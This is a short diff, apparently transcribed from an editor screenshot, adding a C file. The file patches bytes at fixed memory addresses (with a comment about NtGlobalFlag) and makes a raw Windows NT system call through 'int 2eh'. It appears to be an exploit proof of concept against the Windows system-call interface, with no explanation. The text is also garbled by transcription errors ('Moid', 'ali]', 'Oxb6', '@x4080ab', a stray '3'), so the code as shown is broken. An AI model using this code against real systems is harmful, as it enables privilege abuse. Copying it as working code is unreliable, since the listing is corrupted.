@@ -1,0 +1,19 @@
+Moid* a[2];
+
+void main(void){
+int i; for (i=0;i<2;i++) ali]=(void*)o;
+*(char*)(0x4080a4)=0x80; //or bptr [NtGlobalFlag+2],cih
+*(char*)(0x4080a5)=0xed;
+*(char*) (0x4080a6)=Oxb6;
+*(char*)(0x4080a7)=0xc2;
+*(char*) (0x4080a8)=0x14;
+*(char*) (0x4080a9)=0x80;
+*(char*)(0x4080aa)=0xc1;
+*(char*) (@x4080ab)=0xcF;
+
+_asm { mov eax,4346
+mov edx,offset a
+int 2eh
+3
+
+<rc/disk/Cpp1.cpp" [readonly][noeol][dos] 18L, 404¢ 4,1 ALL
